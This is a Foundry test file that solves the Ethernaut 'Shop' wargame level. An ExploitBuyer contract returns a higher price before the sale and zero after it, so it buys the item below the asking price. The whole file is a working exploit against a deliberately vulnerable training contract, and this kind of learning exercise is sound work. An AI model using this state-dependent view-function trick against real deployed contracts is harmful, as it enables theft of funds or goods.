// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../ethernaut/Shop.sol";

contract ExploitBuyer is Buyer {
    Shop shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function buy() external {
        shop.buy();
    }

    function price() external view returns (uint) {
        if(!shop.isSold()) {
            return shop.price() + 1;
        }
        else {
            return uint(0);
        }
    }
}


contract TestShop is Test {
    ExploitBuyer exploitBuyer;
    Shop shop;

    function setUp() external {
        shop = new Shop();
        exploitBuyer = new ExploitBuyer(address(shop));
    }

    function testExploit() external {
        uint oldPrice = shop.price();
        exploitBuyer.buy();
        uint newPrice = shop.price();
        assertTrue(shop.isSold());
        assertTrue(newPrice < oldPrice);
    }
}
